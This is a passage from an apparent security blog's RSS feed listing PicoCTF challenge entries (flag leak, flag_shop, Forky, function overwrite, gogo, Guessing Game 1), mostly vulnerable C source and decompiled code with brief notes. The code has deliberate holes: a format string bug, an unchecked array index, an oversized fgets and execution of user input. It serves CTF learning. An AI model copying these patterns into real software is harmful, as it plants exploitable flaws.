 }
 }
 // result[new_length] = &amp;#39;\xcc&amp;#39;;
 result[new_length] = &amp;#39;\xc3&amp;#39;;

 // Execute code
 int (*code)() = (int(*)())result;
 code();
}

int main(int argc, char *argv[]) {
 setbuf(stdout, NULL);
 char buf[MAX_LENGTH];
 size_t length = 0;
 char c = &amp;#39;\0&amp;#39;;

 printf(&amp;#34;Give me code to run:\n&amp;#34;);
 c = fgetc(stdin);
 while ((c != &amp;#39;\n&amp;#39;) &amp;amp;&amp;amp; (length &amp;lt; MAX_LENGTH)) {
 buf[length] = c;
 c = fgetc(stdin);
 length++;
 }
 if (length % 2) {
 buf[length] = &amp;#39;\x90&amp;#39;;
 length++;
 }
 execute(buf, length);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - flag leak</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---flag-leak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---flag-leak/</guid><description>&lt;h1 id="picoctf---flag-leak">
 PicoCTF - flag leak
 &lt;a class="anchor" href="#picoctf---flag-leak">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Format String Bug
&lt;img src="https://hackmd.io/_uploads/BkqBmpOih.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/SyvLXauon.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,len,f); // size bound read
}

void vuln(){
 char flag[BUFSIZE];
 char story[128];

 readflag(flag, FLAGSIZE);

 printf(&amp;#34;Tell me a story and then I&amp;#39;ll tell you one &amp;gt;&amp;gt; &amp;#34;);
 scanf(&amp;#34;%127s&amp;#34;, story);
 printf(&amp;#34;Here&amp;#39;s a story - \n&amp;#34;);
 printf(story);
 printf(&amp;#34;\n&amp;#34;);
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 
 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - flag_shop</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---flag_shop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---flag_shop/</guid><description>&lt;h1 id="picoctf---flag_shop">
 PicoCTF - flag_shop
 &lt;a class="anchor" href="#picoctf---flag_shop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skill">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skill&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skill">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
 setbuf(stdout, NULL);
 int con;
 con = 0;
 int account_balance = 1100;
 while(con == 0){
 
 printf(&amp;#34;Welcome to the flag exchange\n&amp;#34;);
 printf(&amp;#34;We sell flags\n&amp;#34;);

 printf(&amp;#34;\n1. Check Account Balance\n&amp;#34;);
 printf(&amp;#34;\n2. Buy Flags\n&amp;#34;);
 printf(&amp;#34;\n3. Exit\n&amp;#34;);
 int menu;
 printf(&amp;#34;\n Enter a menu selection\n&amp;#34;);
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;menu);
 if(menu == 1){
 printf(&amp;#34;\n\n\n Balance: %d \n\n\n&amp;#34;, account_balance);
 }
 else if(menu == 2){
 printf(&amp;#34;Currently for sale\n&amp;#34;);
 printf(&amp;#34;1. Defintely not the flag Flag\n&amp;#34;);
 printf(&amp;#34;2. 1337 Flag\n&amp;#34;);
 int auction_choice;
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;auction_choice);
 if(auction_choice == 1){
 printf(&amp;#34;These knockoff Flags cost 900 each, enter desired quantity\n&amp;#34;);
 
 int number_flags = 0;
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;number_flags);
 if(number_flags &amp;gt; 0){
 int total_cost = 0;
 total_cost = 900*number_flags;
 printf(&amp;#34;\nThe final cost is: %d\n&amp;#34;, total_cost);
 if(total_cost &amp;lt;= account_balance){
 account_balance = account_balance - total_cost;
 printf(&amp;#34;\nYour current balance after transaction: %d\n\n&amp;#34;, account_balance);
 }
 else{
 printf(&amp;#34;Not enough funds to complete purchase\n&amp;#34;);
 }
 
 
 }
 
 
 
 
 }
 else if(auction_choice == 2){
 printf(&amp;#34;1337 flags cost 100000 dollars, and we only have 1 in stock\n&amp;#34;);
 printf(&amp;#34;Enter 1 to buy one&amp;#34;);
 int bid = 0;
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;bid);
 
 if(bid == 1){
 
 if(account_balance &amp;gt; 100000){
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if(f == NULL){

 printf(&amp;#34;flag not found: please run this on the server\n&amp;#34;);
 exit(0);
 }
 char buf[64];
 fgets(buf, 63, f);
 printf(&amp;#34;YOUR FLAG IS: %s\n&amp;#34;, buf);
 }
 
 else{
 printf(&amp;#34;\nNot enough funds for transaction\n\n\n&amp;#34;);
 }}

 }
 }
 else{
 con = 1;
 }

 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Forky</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---forky/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---forky/</guid><description>&lt;h1 id="picoctf---forky">
 PicoCTF - Forky
 &lt;a class="anchor" href="#picoctf---forky">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://burweisnote.blogspot.com/2017/09/fork.html"> fork用法與範例 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Main Function From IDA&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _DWORD &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// [esp+8h] [ebp-Ch]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> mmap(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">4u&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">33&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1000000000&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1234567890&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> doNothing(&lt;span style="color:#f92672">*&lt;/span>v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題很有趣，有了background之後其實對這一題的想法差不多就和&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>差不多，也就是parent process fork出child process後會繼續往下fork出grandchild process，直到parent process執行完成&lt;/p>
&lt;blockquote>
&lt;pre tabindex="0">&lt;code>+ 
| 
+-----------------------------------+ 
| | 
+-----------------+ +-----------------+ 
| | | | 
+--------+ +--------+ +--------+ +--------+ 
| | | | | | | | 
+---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ 
| | | | | | | | | | | | | | | | 
O O O O O O O O O O O O O O O O 
&lt;/code>&lt;/pre>&lt;/blockquote>
&lt;p>而且他們所操作的外部記憶體對象都會是一樣的，代表*v4最終會被加16次，只是我沒有考慮到負號的問題，因為該題是32bits，代表加到一定程度會overflow，所以都沒解出來&lt;/p></description></item><item><title>PicoCTF - function overwrite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---function-overwrite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---function-overwrite/</guid><description>&lt;h1 id="picoctf---function-overwrite">
 PicoCTF - function overwrite
 &lt;a class="anchor" href="#picoctf---function-overwrite">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Array Bound&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
 int score = 0;
 for (size_t i = 0; i &amp;lt; len; i++)
 {
 score += story[i];
 }

 return score;
}

void easy_checker(char *story, size_t len)
{
 if (calculate_story_score(story, len) == 1337)
 {
 char buf[FLAGSIZE] = {0};
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if (f == NULL)
 {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf, FLAGSIZE, f); // size bound read
 printf(&amp;#34;You&amp;#39;re 1337. Here&amp;#39;s the flag.\n&amp;#34;);
 printf(&amp;#34;%s\n&amp;#34;, buf);
 }
 else
 {
 printf(&amp;#34;You&amp;#39;ve failed this class.&amp;#34;);
 }
}

void hard_checker(char *story, size_t len)
{
 if (calculate_story_score(story, len) == 13371337)
 {
 char buf[FLAGSIZE] = {0};
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if (f == NULL)
 {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf, FLAGSIZE, f); // size bound read
 printf(&amp;#34;You&amp;#39;re 13371337. Here&amp;#39;s the flag.\n&amp;#34;);
 printf(&amp;#34;%s\n&amp;#34;, buf);
 }
 else
 {
 printf(&amp;#34;You&amp;#39;ve failed this class.&amp;#34;);
 }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
 char story[128];
 int num1, num2;

 printf(&amp;#34;Tell me a story and then I&amp;#39;ll tell you if you&amp;#39;re a 1337 &amp;gt;&amp;gt; &amp;#34;);
 scanf(&amp;#34;%127s&amp;#34;, story);
 printf(&amp;#34;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n&amp;#34;);
 scanf(&amp;#34;%d %d&amp;#34;, &amp;amp;num1, &amp;amp;num2);

 if (num1 &amp;lt; 10)
 {
 fun[num1] += num2;
 }

 check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

 setvbuf(stdout, NULL, _IONBF, 0);

 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - gogo</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---gogo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---gogo/</guid><description>&lt;h1 id="picoctf---gogo">
 PicoCTF - gogo
 &lt;a class="anchor" href="#picoctf---gogo">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">// main.main
void __cdecl main_main()
{
 _slice_interface_ typ[2]; // [esp+0h] [ebp-58h] BYREF
 string *second_flag; // [esp+20h] [ebp-38h]
 string *flag; // [esp+24h] [ebp-34h]
 _slice_interface_ v3; // [esp+28h] [ebp-30h] BYREF
 string *v4; // [esp+34h] [ebp-24h]
 _DWORD v5[2]; // [esp+38h] [ebp-20h] BYREF
 _DWORD v6[2]; // [esp+40h] [ebp-18h] BYREF
 _slice_interface_ v7; // [esp+48h] [ebp-10h] BYREF
 string *v8; // [esp+54h] [ebp-4h]

 flag = runtime_newobject(&amp;amp;RTYPE_string_0);
 typ[0].array = &amp;#34;Enter Password: &amp;#34;;
 typ[0].len = 16;
 memset(&amp;amp;typ[0].cap, 0, sizeof(_slice_interface_));
 fmt_Printf(*&amp;amp;typ[0].array, *&amp;amp;typ[0].cap);
 v6[0] = &amp;amp;RTYPE__ptr_string;
 v6[1] = flag;
 typ[0].array = &amp;#34;%s\n&amp;#34;;
 typ[0].len = 3;
 typ[0].cap = v6;
 *&amp;amp;typ[1].array = 0x100000001LL;
 fmt_Scanf(*&amp;amp;typ[0].array, *&amp;amp;typ[0].cap);
 if ( main_checkPassword(*flag) )
 {
 v5[0] = &amp;amp;RTYPE_string_0;
 v5[1] = &amp;amp;main_statictmp_0;
 typ[0].array = v5;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 v3.cap = &amp;amp;RTYPE_string_0;
 v4 = &amp;amp;main_statictmp_1;
 typ[0].array = &amp;amp;v3.cap;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 v3.array = &amp;amp;RTYPE_string_0;
 v3.len = &amp;amp;main_statictmp_2;
 typ[0].array = &amp;amp;v3;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 second_flag = runtime_newobject(&amp;amp;RTYPE_string_0);
 v7.cap = &amp;amp;RTYPE__ptr_string;
 v8 = second_flag;
 typ[0].array = &amp;#34;%s\n&amp;#34;;
 typ[0].len = 3;
 typ[0].cap = &amp;amp;v7.cap;
 *&amp;amp;typ[1].array = 0x100000001LL;
 fmt_Scanf(*&amp;amp;typ[0].array, *&amp;amp;typ[0].cap);
 main_ambush(*second_flag);
 runtime_deferproc(0, &amp;amp;stru_81046A0);
 }
 else
 {
 v7.array = &amp;amp;RTYPE_string_0;
 v7.len = &amp;amp;main_statictmp_3;
 typ[0].array = &amp;amp;v7;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 }
 runtime_deferreturn(typ[0].array);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Guessing Game 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-1/</guid><description>&lt;h1 id="picoctf---guessing-game-1">
 PicoCTF - Guessing Game 1
 &lt;a class="anchor" href="#picoctf---guessing-game-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP Chain
&lt;a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define BUFSIZE 100
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">increment&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> in) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> in &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">get_random&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> rand() &lt;span style="color:#f92672">%&lt;/span> BUFSIZE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">do_stuff&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">long&lt;/span> ans &lt;span style="color:#f92672">=&lt;/span> get_random();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	ans &lt;span style="color:#f92672">=&lt;/span> increment(ans);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;What number would you like to guess?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> guess[BUFSIZE];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fgets(guess, BUFSIZE, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">long&lt;/span> g &lt;span style="color:#f92672">=&lt;/span> atol(guess);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>g) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;That&amp;#39;s not a valid number!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (g &lt;span style="color:#f92672">==&lt;/span> ans) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			printf(&lt;span style="color:#e6db74">&amp;#34;Congrats! You win! Your prize is this print statement!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			printf(&lt;span style="color:#e6db74">&amp;#34;Nope!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">win&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> winner[BUFSIZE];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;New winner!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fgets(winner, &lt;span style="color:#ae81ff">360&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Congrats %s&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, winner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, NULL, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// Set the gid to the effective gid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">// this prevents /bin/sh from dropping the privileges
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	gid_t gid &lt;span style="color:#f92672">=&lt;/span> getegid();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setresgid(gid, gid, gid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Welcome to my guessing game!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		res &lt;span style="color:#f92672">=&lt;/span> do_stuff();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (res) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			win();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
